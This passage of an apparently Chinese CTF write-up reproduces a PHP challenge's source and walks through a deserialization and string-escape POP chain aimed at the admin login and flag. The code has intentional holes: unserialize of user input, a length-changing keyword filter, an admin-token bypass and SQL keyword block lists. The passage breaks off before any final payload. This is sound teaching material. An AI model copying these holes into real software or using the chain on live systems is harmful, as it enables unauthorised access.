class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//lib.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">safe</span><span class=\"params\">($parm)</span></span>&#123;</span><br><span class=\"line\">    $array= <span class=\"keyword\">array</span>(<span class=\"string\">'union'</span>,<span class=\"string\">'regexp'</span>,<span class=\"string\">'load'</span>,<span class=\"string\">'into'</span>,<span class=\"string\">'flag'</span>,<span class=\"string\">'file'</span>,<span class=\"string\">'insert'</span>,<span class=\"string\">\"'\"</span>,<span class=\"string\">'\\\\'</span>,<span class=\"string\">\"*\"</span>,<span class=\"string\">\"alter\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> str_replace($array,<span class=\"string\">'hacker'</span>,$parm);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $id;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age=<span class=\"keyword\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nickname=<span class=\"keyword\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'username'</span>])&amp;&amp;<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'password'</span>]))&#123;</span><br><span class=\"line\">        $mysqli=<span class=\"keyword\">new</span> dbCtrl();</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;id=$mysqli-&gt;login(<span class=\"string\">'select id,password from user where username=?'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;id)&#123;</span><br><span class=\"line\">        $_SESSION[<span class=\"string\">'id'</span>]=<span class=\"keyword\">$this</span>-&gt;id;  </span><br><span class=\"line\">        $_SESSION[<span class=\"string\">'login'</span>]=<span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"你的ID是\"</span>.$_SESSION[<span class=\"string\">'id'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"你好！\"</span>.$_SESSION[<span class=\"string\">'token'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;id;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $Info=unserialize(<span class=\"keyword\">$this</span>-&gt;getNewinfo());</span><br><span class=\"line\">        $age=$Info-&gt;age;</span><br><span class=\"line\">        $nickname=$Info-&gt;nickname;</span><br><span class=\"line\">        $updateAction=<span class=\"keyword\">new</span> UpdateHelper($_SESSION[<span class=\"string\">'id'</span>], $Info, <span class=\"string\">\"update user SET age=$age,nickname=$nickname where id=\"</span>.$_SESSION[<span class=\"string\">'id'</span>]);</span><br><span class=\"line\">        <span class=\"comment\">//这个功能还没有写完 先占坑</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getNewInfo</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $age=$_POST[<span class=\"string\">'age'</span>];</span><br><span class=\"line\">        $nickname=$_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> safe(serialize(<span class=\"keyword\">new</span> Info($age,$nickname)));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;nickname);<span class=\"comment\">//危</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nickname-&gt;update(<span class=\"keyword\">$this</span>-&gt;age);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"0-0\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Info</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nickname;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $CtrlCase;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($age,$nickname)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age=$age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nickname=$nickname;</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span><span class=\"params\">($name,$argument)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">Class</span> <span class=\"title\">UpdateHelper</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $id;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $newinfo;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $sql;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($newInfo,$sql)</span></span>&#123;</span><br><span class=\"line\">        $newInfo=unserialize($newInfo);</span><br><span class=\"line\">        $upDate=<span class=\"keyword\">new</span> dbCtrl();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;sql;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">dbCtrl</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $hostname=<span class=\"string\">\"127.0.0.1\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $dbuser=<span class=\"string\">\"noob123\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $dbpass=<span class=\"string\">\"noob123\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $database=<span class=\"string\">\"noob123\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $password;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $mysqli;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $token;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;name=$_POST[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;password=$_POST[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;token=$_SESSION[<span class=\"string\">'token'</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span><span class=\"params\">($sql)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;mysqli=<span class=\"keyword\">new</span> mysqli(<span class=\"keyword\">$this</span>-&gt;hostname, <span class=\"keyword\">$this</span>-&gt;dbuser, <span class=\"keyword\">$this</span>-&gt;dbpass, <span class=\"keyword\">$this</span>-&gt;database);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"连接失败，错误:\"</span> . <span class=\"keyword\">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $result=<span class=\"keyword\">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class=\"line\">        $result-&gt;bind_param(<span class=\"string\">'s'</span>, <span class=\"keyword\">$this</span>-&gt;name);</span><br><span class=\"line\">        $result-&gt;execute();</span><br><span class=\"line\">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class=\"line\">        $result-&gt;fetch();</span><br><span class=\"line\">        $result-&gt;close();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;token==<span class=\"string\">'admin'</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> $idResult;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!$idResult) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span>(<span class=\"string\">'用户不存在!'</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (md5(<span class=\"keyword\">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span>(<span class=\"string\">'密码错误！'</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $_SESSION[<span class=\"string\">'token'</span>]=<span class=\"keyword\">$this</span>-&gt;name;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $idResult;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span><span class=\"params\">($sql)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//还没来得及写</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//login.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(<span class=\"string\">'lib.php'</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;meta http-equiv=<span class=\"string\">\"Content-Type\"</span> content=<span class=\"string\">\"text/html; charset=utf-8\"</span> /&gt; </span><br><span class=\"line\">&lt;title&gt;login&lt;/title&gt;</span><br><span class=\"line\">&lt;center&gt;</span><br><span class=\"line\">\t&lt;form action=<span class=\"string\">\"login.php\"</span> method=<span class=\"string\">\"post\"</span> style=<span class=\"string\">\"margin-top: 300\"</span>&gt;</span><br><span class=\"line\">\t\t&lt;h2&gt;百万前端的用户信息管理系统&lt;/h2&gt;</span><br><span class=\"line\">\t\t&lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;/h3&gt;</span><br><span class=\"line\">        \t\t&lt;input type=<span class=\"string\">\"text\"</span> name=<span class=\"string\">\"username\"</span> placeholder=<span class=\"string\">\"UserName\"</span> required&gt;</span><br><span class=\"line\">\t\t&lt;br&gt;</span><br><span class=\"line\">\t\t&lt;input type=<span class=\"string\">\"password\"</span> style=<span class=\"string\">\"margin-top: 20\"</span> name=<span class=\"string\">\"password\"</span> placeholder=<span class=\"string\">\"password\"</span> required&gt;</span><br><span class=\"line\">\t\t&lt;br&gt;</span><br><span class=\"line\">\t\t&lt;button style=<span class=\"string\">\"margin-top:20;\"</span> type=<span class=\"string\">\"submit\"</span>&gt;登录&lt;/button&gt;</span><br><span class=\"line\">\t\t&lt;br&gt;</span><br><span class=\"line\">\t\t&lt;img src=<span class=\"string\">'img/1.jpg'</span>&gt;大家记得做好防护&lt;/img&gt;</span><br><span class=\"line\">\t\t&lt;br&gt;</span><br><span class=\"line\">\t\t&lt;br&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">$user=<span class=\"keyword\">new</span> user();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'username'</span>]))&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\"</span>, $_POST[<span class=\"string\">'username'</span>]))&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">die</span>(<span class=\"string\">\"&lt;br&gt;Damn you, hacker!\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\"</span>, $_POST[<span class=\"string\">'password'</span>]))&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">die</span>(<span class=\"string\">\"Damn you, hacker!\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t$user-&gt;login();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">\t&lt;/form&gt;</span><br><span class=\"line\">&lt;/center&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//update.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(<span class=\"string\">'lib.php'</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'&lt;html&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;meta charset=\"utf-8\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/html&gt;'</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_SESSION[<span class=\"string\">'login'</span>]!=<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"你还没有登陆呢！\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$users=<span class=\"keyword\">new</span> User();</span><br><span class=\"line\">$users-&gt;update();</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">'login'</span>]===<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">require_once</span>(<span class=\"string\">\"flag.php\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>大意就是获取admin的密码登入就可以拿到flag。主要审计是lib.php</p>\n<p>当时审的时候没有注意到<code>__toString</code>这个魔法方法，快结束的时候才注意到。主要还是太菜了</p>\n<p>____toString:在 PHP 5.2.0 之前，__toString() 方法只有在直接使用于 <a href=\"http://php.net/manual/zh/function.echo.php\" target=\"_blank\" rel=\"noopener\">echo</a> 或 <a href=\"http://php.net/manual/zh/function.print.php\" target=\"_blank\" rel=\"noopener\">print</a> 时才能生效。PHP 5.2.0 之后，则可以在任何字符串环境生效（例如通过 <a href=\"http://php.net/manual/zh/function.printf.php\" target=\"_blank\" rel=\"noopener\">printf()</a>，使用 <em>%s</em> 修饰符），但不能用于非字符串环境（如使用 <em>%d</em> 修饰符）。自 PHP 5.2.0 起，如果将一个未定义 __toString() 方法的对象转换为字符串，会产生 <code>E_RECOVERABLE_ERROR</code> 级别的错误。</p>\n<p>index.php是注入不了的。只能在update.php想办法</p>\n<p>user.php中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$users=<span class=\"keyword\">new</span> User();</span><br><span class=\"line\">$users-&gt;update();</span><br></pre></td></tr></table></figure>\n\n<p>去查看user类的update方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $Info=unserialize(<span class=\"keyword\">$this</span>-&gt;getNewinfo());</span><br><span class=\"line\">        $age=$Info-&gt;age;</span><br><span class=\"line\">        $nickname=$Info-&gt;nickname;</span><br><span class=\"line\">        $updateAction=<span class=\"keyword\">new</span> UpdateHelper($_SESSION[<span class=\"string\">'id'</span>], $Info, <span class=\"string\">\"update user SET age=$age,nickname=$nickname where id=\"</span>.$_SESSION[<span class=\"string\">'id'</span>]);</span><br><span class=\"line\">        <span class=\"comment\">//这个功能还没有写完 先占坑</span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里有unserialize函数，且$this-&gt;getNewinfo()可控，存在序列化漏洞</p>\n<p>跳转到getNewinfo方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getNewInfo</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $age=$_POST[<span class=\"string\">'age'</span>];</span><br><span class=\"line\">        $nickname=$_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> safe(serialize(<span class=\"keyword\">new</span> Info($age,$nickname)));</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>再跳转到Info类</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Info</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nickname;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $CtrlCase;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($age,$nickname)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age=$age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nickname=$nickname;</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span><span class=\"params\">($name,$argument)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里如果$this-&gt;CtrlCase是dbCtrl类的实例魔法方法__call可以调用到dbCtrl::logon（）</p>\n<p>且在User::getNewInfo方法中调用了一个safe过滤函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">safe</span><span class=\"params\">($parm)</span></span>&#123;</span><br><span class=\"line\">    $array= <span class=\"keyword\">array</span>(<span class=\"string\">'union'</span>,<span class=\"string\">'regexp'</span>,<span class=\"string\">'load'</span>,<span class=\"string\">'into'</span>,<span class=\"string\">'flag'</span>,<span class=\"string\">'file'</span>,<span class=\"string\">'insert'</span>,<span class=\"string\">\"'\"</span>,<span class=\"string\">'\\\\'</span>,<span class=\"string\">\"*\"</span>,<span class=\"string\">\"alter\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> str_replace($array,<span class=\"string\">'hacker'</span>,$parm);</span><br></pre></td></tr></table></figure>\n\n<p>存在序列化字符串逃逸漏洞</p>\n<p>执行完后，回到User::update方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $Info=unserialize(<span class=\"keyword\">$this</span>-&gt;getNewinfo());</span><br><span class=\"line\">        $age=$Info-&gt;age;</span><br><span class=\"line\">        $nickname=$Info-&gt;nickname;</span><br><span class=\"line\">        $updateAction=<span class=\"keyword\">new</span> UpdateHelper($_SESSION[<span class=\"string\">'id'</span>], $Info, <span class=\"string\">\"update user SET age=$age,nickname=$nickname where id=\"</span>.$_SESSION[<span class=\"string\">'id'</span>]);</span><br><span class=\"line\">        <span class=\"comment\">//这个功能还没有写完 先占坑</span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>跳转到UpdateHelper类</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">Class</span> <span class=\"title\">UpdateHelper</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $id;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $newinfo;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $sql;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($newInfo,$sql)</span></span>&#123;</span><br><span class=\"line\">        $newInfo=unserialize($newInfo);</span><br><span class=\"line\">        $upDate=<span class=\"keyword\">new</span> dbCtrl();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;sql;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果$this-&gt;sql是一个类对象会触发User::__toString方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span 